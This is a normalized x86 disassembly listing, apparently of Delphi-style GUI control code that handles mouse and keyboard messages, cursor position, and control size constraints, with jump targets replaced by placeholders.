push eax
mov eax esi
call sub_4489b0
mov ecx eax
xor edx edx
xor eax eax
call sub_4170c4
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403324
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_449f68
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_449f98
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_44a004
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_44a0c4
sub_44a034
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_44a064
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_448af0
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44a090
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_44a0c4
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_44a198
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44a1cc
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_44a264
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_4607d8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_4607d8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_448b4c
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_46a028
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403324
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_4606fc
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403324
jmp r-xdata
sub_44a3f8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408a8c
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408ab8
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_448b4c
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_4088d0
call sub_40886c
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_40886c
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_44a4a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_44a4d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_44a494
push ebp
call sub_44a4a0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a520
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_44a5ac
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_44a5e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_44a064
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_46066c
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403324
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_46066c
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403324
sub_44a668
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_448b1c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4491e4
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_44a5e4
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_44a6b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_448b1c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_44a6d0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_448b1c
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4491e4
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44a5e4
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403324
sub_44a728
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_44a004
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_449f98
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_44a004
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_44a7c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44a5e4
pop esi
pop ebx
retn
sub_44a7e9
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44a5e4
pop esi
pop ebx
retn
sub_44a80f
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44a5e4
pop esi
pop ebx
retn
sub_44a839
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44a5e4
pop esi
pop ebx
retn
sub_44a864
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_44a894
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_44a064
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_46066c
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403324
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_46066c
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403324
sub_44a90c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_44a944
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_46066c
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403324
sub_44a97c
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_4491e4
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44a944
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406b7c
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403324
sub_44a9f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44a944
pop esi
pop ebx
retn
sub_44aa14
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44a944
pop esi
pop ebx
retn
sub_44aa34
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_46066c
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403324
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_454180
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44aa8c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4491d4
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_4491e4
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_44a198
pop esi
retn
sub_44aacc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_44a1cc
sub_44ab7c
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_4493f4
mov cl 0x1
sub_44abbc
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_44914c
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_44914c
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_44abec
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_44ac10
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406b7c
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403324
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_44a198
mov [ ebx + 0xc ] eax
sub_44acb4
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_4490a0
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_4490a0
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_44ad48
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_403070
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_448718
mov edx [ esp ]
mov eax esi
call sub_4486f4
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_4489c8
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_448a0c
sub_44adcc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_417088
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_448ac4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_4170ec
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44896c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ae58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_44ad48
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_44f7d8
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_44adcc
pop ecx
jmp r-xdata
sub_44aeb8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_44afa6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44afad
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_448fdc
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_448fac
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_448fac
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4042c4
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403f0c
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_448ecc
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_44afb4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
